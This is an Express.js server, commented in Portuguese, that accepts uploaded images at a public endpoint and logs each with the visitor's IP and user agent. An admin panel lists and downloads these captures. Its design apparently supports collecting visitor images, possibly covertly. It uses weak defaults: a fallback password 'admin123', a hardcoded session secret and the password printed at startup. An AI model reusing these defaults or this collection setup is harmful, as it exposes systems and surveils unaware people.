const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// --- Configuração ---
const IS_VERCEL = process.env.VERCEL || process.env.VERCEL_ENV;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

// No Vercel, o único diretório de escrita permitido é o /tmp
const BASE_DIR = IS_VERCEL ? '/tmp' : __dirname;
const UPLOADS_DIR = path.join(BASE_DIR, 'uploads');
const DATA_FILE = path.join(BASE_DIR, 'data', 'captures.json');

// Cria diretórios necessários
[UPLOADS_DIR, path.join(BASE_DIR, 'data')].forEach(dir => {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// Inicializa arquivo de dados
if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, '[]');

// --- Middlewares ---
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
  secret: process.env.SESSION_SECRET || 'captura_sessao_fallback_seguro_2026',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 1000 * 60 * 60 * 4 } // 4 horas
}));

// --- Helpers ---
function loadData() {
  try { return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); }
  catch { return []; }
}

function saveData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

function requireAuth(req, res, next) {
  if (req.session && req.session.authenticated) return next();
  res.status(401).json({ error: 'Não autorizado' });
}

function getClientIP(req) {
  return (
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.headers['x-real-ip'] ||
    req.socket.remoteAddress ||
    'desconhecido'
  );
}

// --- Rotas públicas ---

// Recebe captura
app.post('/api/capture', (req, res) => {
  const { image, meta } = req.body;

  if (!image || !image.startsWith('data:image/')) {
    return res.status(400).json({ error: 'Imagem inválida' });
  }

  try {
    const id = crypto.randomUUID();
    const timestamp = new Date().toISOString();
    const filename = `${id}.jpg`;
    const filepath = path.join(UPLOADS_DIR, filename);

    // Salva imagem
    const base64 = image.replace(/^data:image\/\w+;base64,/, '');
    fs.writeFileSync(filepath, Buffer.from(base64, 'base64'));

    // Salva metadata
    const record = {
      id,
      filename,
      timestamp,
      ip: getClientIP(req),
      userAgent: req.headers['user-agent'] || 'desconhecido',
      meta: meta || {}
    };

    const data = loadData();
    data.unshift(record); // mais recente primeiro
    saveData(data);

    console.log(`[${timestamp}] Nova captura: ${id} | IP: ${record.ip}`);
    res.json({ success: true, id });

  } catch (err) {
    console.error('Erro ao salvar captura:', err);
    res.status(500).json({ error: 'Erro interno' });
  }
});

// Login admin
app.post('/api/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    req.session.authenticated = true;
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Senha incorreta' });
  }
});

// Logout
app.post('/api/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true });
});

// Verificar sessão
app.get('/api/me', (req, res) => {
  res.json({ authenticated: !!(req.session && req.session.authenticated) });
});

// --- Rotas protegidas ---

// Lista capturas
app.get('/api/captures', requireAuth, (req, res) => {
  const data = loadData();
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 20;
  const start = (page - 1) * limit;

  res.json({
    total: data.length,
    page,
    pages: Math.ceil(data.length / limit),
    items: data.slice(start, start + limit)
  });
});

// Estatísticas
app.get('/api/stats', requireAuth, (req, res) => {
  const data = loadData();
  const today = new Date().toISOString().slice(0, 10);

  const todayCount = data.filter(c => c.timestamp.startsWith(today)).length;

  const ipCount = {};
  data.forEach(c => { ipCount[c.ip] = (ipCount[c.ip] || 0) + 1; });
  const topIPs = Object.entries(ipCount)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .map(([ip, count]) => ({ ip, count }));

  res.json({
    total: data.length,
    today: todayCount,
    topIPs
  });
});

// Serve imagem (protegida)
app.get('/uploads/:filename', requireAuth, (req, res) => {
  const filepath = path.join(UPLOADS_DIR, path.basename(req.params.filename));
  if (!fs.existsSync(filepath)) return res.status(404).send('Não encontrado');
  res.sendFile(filepath);
});

// Deleta captura
app.delete('/api/captures/:id', requireAuth, (req, res) => {
  const data = loadData();
  const index = data.findIndex(c => c.id === req.params.id);
  if (index === -1) return res.status(404).json({ error: 'Não encontrado' });

  const { filename } = data[index];
  data.splice(index, 1);
  saveData(data);

  const filepath = path.join(UPLOADS_DIR, filename);
  if (fs.existsSync(filepath)) fs.unlinkSync(filepath);

  res.json({ success: true });
});

// Deleta todas
app.delete('/api/captures', requireAuth, (req, res) => {
  const data = loadData();
  data.forEach(c => {
    const fp = path.join(UPLOADS_DIR, c.filename);
    if (fs.existsSync(fp)) fs.unlinkSync(fp);
  });
  saveData([]);
  res.json({ success: true, deleted: data.length });
});

// Download da imagem
app.get('/api/captures/:id/download', requireAuth, (req, res) => {
  const data = loadData();
  const record = data.find(c => c.id === req.params.id);
  if (!record) return res.status(404).json({ error: 'Não encontrado' });

  const filepath = path.join(UPLOADS_DIR, record.filename);
  if (!fs.existsSync(filepath)) return res.status(404).send('Arquivo não encontrado');

  res.download(filepath, `captura-${record.timestamp.slice(0, 19).replace(/:/g, '-')}.jpg`);
});

// --- Start ---
app.listen(PORT, () => {
  console.log(`\n✅ Servidor rodando em http://localhost:${PORT}`);
  console.log(`🔐 Painel admin: http://localhost:${PORT}/admin.html`);
  console.log(`🔑 Senha admin: ${ADMIN_PASSWORD}\n`);
});
